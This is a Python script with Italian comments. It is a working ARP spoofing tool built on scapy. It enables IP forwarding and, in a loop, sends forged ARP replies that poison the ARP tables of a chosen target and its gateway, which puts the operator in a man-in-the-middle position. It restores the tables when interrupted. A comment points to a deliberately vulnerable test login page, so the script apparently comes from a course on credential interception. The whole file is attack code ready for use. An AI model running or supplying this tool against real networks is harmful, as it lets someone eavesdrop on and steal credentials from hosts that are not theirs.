#!/usr/bin/env python3

import scapy.all as scapy
# Documentazione scapy : https://scapy.readthedocs.io/en/latest/
import time
import subprocess
# Documetazione subprocess : https://docs.python.org/3/library/subprocess.html
import argparse
# Documentazione arparse : https://docs.python.org/3.3/library/argparse.html

# Sito vulnerabile login HTTP prova : http://testphp.vulnweb.com/login.php


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Inserire l'indirizzo del target")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Inserire l'indirizzo del gateway")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Specificare l'indirizzo IP del Target, vedere --help per maggiori informazioni.")
    if not options.gateway:
        parser.error("[-] Specificare l'indirizzo IP del Gateway, vedere --help per maggiori informazioni.")
    return options

# Ottenere l'indirizzo mac di destinazione utilizzando l'indirizzo IP
def get_mac(ip):
    #Documentazione Scapy ARP ping : https://scapy.readthedocs.io/en/latest/usage.html#arp-ping
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    return answered_list[0][1].hwsrc

# Cambiare l'indirizzo mac nelle ARP Table
# Documetazione invio e ricezione pacchetti con scapy : https://scapy.readthedocs.io/en/latest/usage.html#send-and-receive-packets-sr
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Ripristino ARP TAble
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def main():
    options = get_arguments()
    subprocess.check_call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    packets_count = 0
    try:
        while True:
            spoof(options.target, options.gateway)
            spoof(options.gateway, options.target)
            packets_count += 2
            print(f"\r[+] Pacchetti Inviati : {packets_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        subprocess.call("clear", shell=True)
        print("\n[+] Hai premuto CTR+C.... Ripristino ARP Table")
        restore(options.target, options.gateway)
        restore(options.gateway, options.target)
        print("\n[+] ARP table ripristinate")

if __name__ == "__main__":
    main()